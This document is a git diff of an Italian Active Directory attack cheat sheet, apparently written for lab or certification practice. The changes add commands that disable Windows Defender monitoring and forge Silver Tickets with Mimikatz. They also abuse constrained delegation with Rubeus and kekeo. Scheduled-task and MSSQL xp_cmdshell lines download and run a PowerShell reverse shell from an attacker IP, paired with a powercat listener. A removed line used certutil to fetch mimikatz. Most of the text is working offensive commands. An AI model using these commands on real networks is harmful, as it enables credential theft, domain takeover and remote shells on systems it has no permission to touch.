@@ -1,30 +1,5 @@
 # Active-Directory-Cheat-Sheet
 
-## Summary
-- Bypass Execution Policy
-
-- Enumeration via PowerView
-
-- Archiviazione e recupero credenziali memorizzate (Lateral Movement)
-	- Access as Local Admin (Need Privilege Escalation)
-
-- Kerberoasting
-	- Access as any user required
-
-- AS-REP Roasting
-	- Access as any user required
-
-- Golden Ticket
-	- Full domain compromise (domain admin) required 
-
-- Silver Ticket
-	- Service hash required 
-
-- Skeleton Key
-	- Full domain compromise (domain admin) required
-
-- Bruteforce with kerbrute
-
 ## Bypass Execution Policy
 ```
 	- powershell -ep bypass -c "command"
@@ -33,7 +8,18 @@
 	- $env:PSExecutionPolicyPreference="bypass"
 	
 ```
+## Disable Firewall
+```
+	- Set-MpPreference -DisableRealtimeMonitoring $ture -Verbose
+	- Set-MpPreference -DisableIOAVprotection $true -Verbose
+```
 
+## Enter in a new machine vias rdp or via powershell
+
+```
+	- Get-Credentials [via RDP]
+	- Enter-PSSession -ComputerName techsrv30.tech.finance.corp -Credential tech\techservice [successivamente verrà chiesta la password]
+```
 ## Enumeration via Powerview
 
 ### PowerView:
@@ -193,29 +179,25 @@ o
 ```
 ## Silver Ticket [Domain Admins]
 ### I Silver Ticket sono ticket TGS (Ticket Granting Service) contraffatti creati da un utente malintenzionato utilizzando l'hash della password di un account di servizio compromesso. Quando un utente malintenzionato ha violato la password di un account di servizio, potrebbe sembrare che non avrebbe bisogno di falsificare i ticket per agire per suo conto. Mentre un biglietto d'oro è un TGT falso valido per ottenere l'accesso a qualsiasi servizio Kerberos, il biglietto d'argento è un TGS contraffatto. Ciò significa che l'ambito Silver Ticket è limitato a qualsiasi servizio destinato a un server specifico.
-### Mentre un ticket Golden viene crittografato/firmato con l'account del servizio Kerberos di dominio ( KRBTGT) , un ticket Silver viene crittografato/firmato dall'account del servizio (credenziale dell'account del computer estratta dal SAM locale del computer o credenziale dell'account del servizio)
+### Mentre un ticket Golden viene crittografato/firmato con l'account del servizio Kerberos di dominio (KRBTGT) , un ticket Silver viene crittografato/firmato dall'account del servizio (credenziale dell'account del computer estratta dal SAM locale del computer o credenziale dell'account del servizio)
 ### I biglietti d'argento possono essere più pericolosi dei biglietti d'oro: sebbene l'ambito sia più limitato dei biglietti d'oro, l'hash richiesto è più facile da ottenere e non c'è comunicazione con un controller di dominio quando li si utilizza, quindi il rilevamento è più difficile di quelli d'oro Biglietti.
 ## Prerequisito: Per creare o falsificare un Silver Ticket, l'attaccante deve conoscere i dati della password (hash della password) per il servizio di destinazione. Se il servizio di destinazione è in esecuzione nel contesto di un account utente, come MS-SQL, è necessario l'hash della password dell'account di servizio per creare un Silver Ticket. (https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
 - Servizio CIFS (Ma possono essere altri servizi come HOST). Il servizio CIFS permette di accedere al file system della vittima.
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
-			- Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:CIFS" "/target:$TARGET_SERVER_FQDN" /user:NonExistentUser /rc4:$NTLM_HASH_Service_Account '
-			- Invoke-Mimikatz -Command 'kerberos::ptt ticket.kirbi'
-			- .\PsExec.exe -accepteula \\TARGET_SERVER_FQDN cmd (ottenere la shell)
-			o
-			- dir \\TARGET_SERVER_FQDN\C$
+			- Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:CIFS" "/target:mgmtsrv.TECH.FINANCE.CORP" /user:Administrator /rc4:$NTLM_HASH_Service_Account /ptt'
 ```
-
+- Servizio HOST (schedule a task sul target).
 ```
-			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
-			- mimikatz.exe '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:CIFS" "/target:$TARGET_SERVER_FQDN" /user:NonExistentUser /rc4:$NTLM_HASH_Service_Account'
-			- mimikatz.exe "kerberos::ptt ticket.kirbi" (Inject in memory using mimikatz or Rubeus)
-			o
-			- .\Rubeus.exe ptt /ticket:ticket.kirbi
-			-.\PsExec.exe -accepteula \\TARGET_SERVER_FQDN cmd (ottenere la shell)
-			o
-			- dir \\TARGET_SERVER_FQDN\C$
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:HOST" "/target:mgmtsrv.TECH.FINANCE.CORP" /user:Administrator /rc4:$NTLM_HASH_Service_Account /ptt'
+			- schtasks /create /S mgmtsrv.TECH.FINANCE.CORP /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString('http://172.16.100.68:8080/Invoke-PowerShellTcp.ps1')'"
+			- schtasks /Run /S mgmtsrv.TECH.FINANCE.CORP /TN "STCheck"
+			- Import-Module powercat.ps1
+			- powercat -l -v -t 1000 -p 2023
+Execute the task
 ```
 ## Skeleton Key [Domain Admins]
 ### Questo attacco si impianta in LSASS e crea una password principale che funzionerà per qualsiasi account Active Directory nel dominio. Poiché anche le attuali password degli utenti continuano a funzionare, un attacco Skeleton Key non interromperà il processo di autenticazione, quindi gli attacchi sono difficili da individuare a meno che tu non sappia cosa cercare. Il riavvio del DC rimuoverà questo attacco. Si potrà accedere a qualsiasi pc con username valido e password che di default sarà mimikatz
@@ -241,6 +223,44 @@ o
 			- mimikatz.exe '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "/target: FQDN_DC" "misc::skeleton" "!-"'
 			- Enter-PSSession -Computername DC -credential Domain\Administrator
 ```
+
+
+## Contrained Delegation [Local Admin on machine]
+### 1) Un utente, Joe, si autentica al servizio web (in esecuzione con l'account servizio studvm ) utilizzando un meccanismo di autenticazione non compatibile con Kerberos.
+### 2) Il servizio web richiede un ticket al Key Distribution Center (KDC) per l'account di Joe.
+### 3) Il KDC controlla il valore userAccountControl di studvm per l'attributo TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION e che l'account di Joe non sia bloccato per la delega. In caso di esito positivo, viene restituito un ticket inoltrabile per l'account di Joe (S4U2Self).
+### 4) Il servizio passa quindi questo ticket al KDC e richiede un ticket di servizio per il servizio CIFS/mgmtsrv.TECH.FINANCE.CORP .
+### 5) Il KDC controlla il campo msDS AllowedToDelegateTo dell'account websvc. Se il servizio è presente nell'elenco, restituirà un ticket di servizio per mgmtsrv (S4U2Proxy).
+### 6) Il servizio Web può ora autenticarsi al CIFS su mgmtsrv come Joe utilizzando il TGS fornito.
+## Prerequisiti: Richiesto local Admin on machine and Hash machine di partenza. Per abusare della delega vincolata nello scenario sopra descritto, è necessario avere accesso all'account studvm. Se si ha accesso a tale account, è possibile accedere ai servizi elencati in msDS AllowedToDelegateTo dell'account websvc come QUALSIASI utente.
+```
+			- Get-DomainUser -TrustedToAuth
+			- Get-DomainComputer -TrustedToAuth
+			- powershell -ep bypass
+			- kekeo@ tgt::ask /user:studvm /domain:TECH.FINANCE.CORP /rc4:[HASH account servizio studvm] [step 2 e 3]
+			- .\Rubeus.exe s4u /user:studvm /rc4:[HASH account servizio studvm] /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.TECH.FINANCE.CORP /altservice:HOST /ptt [alservice= può essere fornito per sostituire uno o più nomi di servizio nel file .kirbi risultante]
+			- klist
+```	
+
+
+## MSSQL Servers
+### I server MS SQL sono generalmente distribuiti in abbondanza in un dominio Windows.
+### I server SQL offrono ottime possibilità di spostamento laterale, in quanto gli utenti del dominio possono essere mappati su ruoli di database.
+
+```
+			- powershell -ep bypass
+			- Import-Module PowerupSQL.psd1
+			- Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose [Gather information]
+			- Get-SQLServerLinkCrawl -Instance dbserver31.TECH.FINANCE.CORP -Query 'exec master..xp_cmds hell "powershell iex(New-Object Net.WebClient).DownloadString("http://$IP_Attacker/Invoke-PowerShellTcp.ps1")"' [esecuzione commandi]
+```	
+
+
+
+
+
+
+
+
 ## DSRM (Directory Services Restore Mode) [Domain Admins]
 ### C'è un local administrator su ogni DC chiamato Administrator la cui password è DSRM password. Tale password èrichiesta quando un server è promosso a DC e viene cambiata raramente. Quindi è possibile usare NTLM hash di questo user per accedere a DC.
 ## Prerequisiti: Richiesto Domain Admins privileges
@@ -304,3 +324,5 @@ o
 			- Set-ADACL -DistinguishedName 'CN=AdminSDHolder, CN=System, DC=dollarcorp, DC=nomeycorp,DC=local' -Principal claudionepc -Verbose (Usare modulo ActiveDrectory)
 			- Invoke-SDPropagator -timeoutMinutes 1 -showProgress
 ```
+
+## Trust Flow Across Forest
